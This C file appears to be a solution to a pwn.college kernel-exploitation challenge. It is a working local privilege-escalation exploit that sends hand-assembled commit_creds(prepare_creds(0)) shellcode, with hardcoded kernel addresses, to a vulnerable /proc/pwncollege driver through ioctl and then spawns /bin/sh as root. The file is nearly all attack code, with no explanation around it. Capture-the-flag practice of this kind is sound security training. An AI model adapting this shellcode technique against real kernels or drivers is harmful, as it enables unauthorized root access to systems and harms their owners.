#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <string.h>

#define SHELLCODE_SIZE 0x1000

int main()
{
    int res = 0;

    int fd = open("/proc/pwncollege", O_RDONLY);
    if (fd < 0)
    {
        goto cleanup;
    }

    /* Simple commit_creds(prepare_creds(0)) shellcode, having prologe and epiloge
    push rbx
    push rbp
    mov rbp, rsp
    xor rdi, rdi
    mov rbx, 0xffffffff81089660
    call rbx
    mov rdi, rax
    mov rbx, 0xffffffff81089310
    call rbx
    mov rsp, rbp
    pop rbp
    pop rbx
    ret    
    */
    uint8_t shellcode[SHELLCODE_SIZE] = { 0x53, 0x55, 0x48, 0x89, 0xE5, 0x48, 0x31, 0xFF, 0x48, 0xC7, 0xC3, 0x60, 0x96, 0x08, 0x81, 0xFF, 0xD3, 0x48, 0x89, 0xC7, 0x48, 0xC7, 0xC3, 0x10, 0x93, 0x08, 0x81, 0xFF, 0xD3, 0x48, 0x89, 0xEC, 0x5D, 0x5B, 0xC3 };
    size_t length = SHELLCODE_SIZE;
    size_t execute_addr = 0xffffc90000085000;

    uint8_t arg[sizeof(length) + sizeof(shellcode) + sizeof(execute_addr)] = { 0 };
    memcpy(arg, &length, sizeof(length));
    memcpy(arg + sizeof(length), &shellcode[0], sizeof(shellcode));
    memcpy(arg + sizeof(arg) - sizeof(size_t), &execute_addr, sizeof(execute_addr));

    long cmd = 1337;
    if (ioctl(fd, cmd, arg) < 0)
    {
        goto cleanup;
    }

    char *const argv[] = { "/bin/sh", 0 };
    execve(argv[0], argv, 0);

    return 0;

cleanup:
    return 1;
}
